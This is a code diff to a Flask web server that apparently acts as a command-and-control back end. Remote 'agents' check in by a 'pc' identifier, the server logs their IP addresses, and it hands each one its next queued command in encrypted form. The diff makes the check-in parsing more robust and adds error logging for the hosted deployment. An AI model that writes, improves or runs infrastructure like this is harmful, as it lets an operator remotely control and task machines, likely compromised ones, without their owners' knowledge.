@@ -47,18 +47,26 @@ def status():
     try:
         ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
         
-        # We try to decrypt, but allow raw params for the bridge logic
-        raw_payload = request.get_data().decode()
-        
-        # Parse params (id=...&pc=...)
-        params = dict(x.split('=') for x in raw_payload.split('&'))
-        agent_id = params.get('pc', 'Unknown')
-        
+        # 1. Try to get JSON first, then Form, then fallback to raw parsing
+        data = request.get_json(silent=True)
+        if data:
+            agent_id = data.get('pc')
+        else:
+            agent_id = request.form.get('pc')
+
+        # 2. Manual fallback for raw string (id=...&pc=...)
+        if not agent_id:
+            raw_payload = request.get_data().decode()
+            params = dict(x.split('=') for x in raw_payload.split('&') if '=' in x)
+            agent_id = params.get('pc', 'Unknown')
+
+        # 3. Save to Database
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("REPLACE INTO agents (id, last_seen, info, remote_ip) VALUES (?, ?, ?, ?)",
                   (agent_id, time.strftime("%H:%M:%S"), "Active", ip))
         
+        # 4. Check for tasks
         c.execute("SELECT id, command FROM tasks WHERE agent_id = ? ORDER BY id ASC LIMIT 1", (agent_id,))
         task = c.fetchone()
         
@@ -72,7 +80,8 @@ def status():
         conn.commit()
         conn.close()
         return encrypt_data("IDLE")
-    except:
+    except Exception as e:
+        print(f"Error in status: {e}") # This helps you see errors in Render logs
         return encrypt_data("IDLE")
 
 @app.route('/api/v1/results', methods=['POST'])
@@ -141,3 +150,4 @@ def add_task():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
